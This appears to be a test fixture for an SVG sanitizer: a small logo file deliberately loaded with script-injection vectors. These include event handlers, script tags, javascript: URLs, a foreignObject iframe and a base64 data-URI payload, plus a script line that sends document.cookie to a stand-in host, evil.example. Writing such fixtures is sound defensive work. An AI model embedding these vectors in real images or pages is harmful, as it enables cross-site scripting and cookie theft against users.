<?xml version="1.0" encoding="UTF-8"?>
<!-- A logo carrying every way an SVG has been used to run or load something. The sanitizer must
     keep the two shapes and the gradient and drop everything else. -->
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
     xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"
     width="120" height="40" viewBox="0 0 120 40" onload="alert('onload')" inkscape:version="1.3">
  <script type="text/javascript">alert('script')</script>
  <script><![CDATA[ fetch('https://evil.example/steal?c=' + document.cookie) ]]></script>
  <style>@import url(https://evil.example/x.css); rect { background: url(https://evil.example/track.png) }</style>
  <defs>
    <linearGradient id="g" x1="0" x2="1" href="https://evil.example/remote.svg#g">
      <stop offset="0" stop-color="#1f4e79"/>
      <stop offset="1" stop-color="#2e86c1" onclick="alert('stop')"/>
    </linearGradient>
  </defs>
  <rect x="0" y="0" width="120" height="40" rx="6" fill="url(#g)" style="fill: url(javascript:alert(1))"/>
  <circle cx="20" cy="20" r="12" fill="url('https://evil.example/paint')" stroke="#ffffff"/>
  <a xlink:href="javascript:alert('link')"><text x="40" y="26">Click</text></a>
  <a href="https://evil.example/"><rect width="1" height="1"/></a>
  <foreignObject width="100" height="100"><iframe xmlns="http://www.w3.org/1999/xhtml" src="https://evil.example/"></iframe></foreignObject>
  <image href="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIi8+" width="1" height="1"/>
  <use xlink:href="https://evil.example/sprite.svg#icon"/>
  <use href="#g"/>
  <animate attributeName="href" to="javascript:alert('animate')"/>
  <set attributeName="onmouseover" to="alert('set')"/>
  <text x="40" y="34" font-family="sans-serif">Lee &amp; Daughters</text>
  <iframe src="javascript:alert('iframe')"/>
</svg>
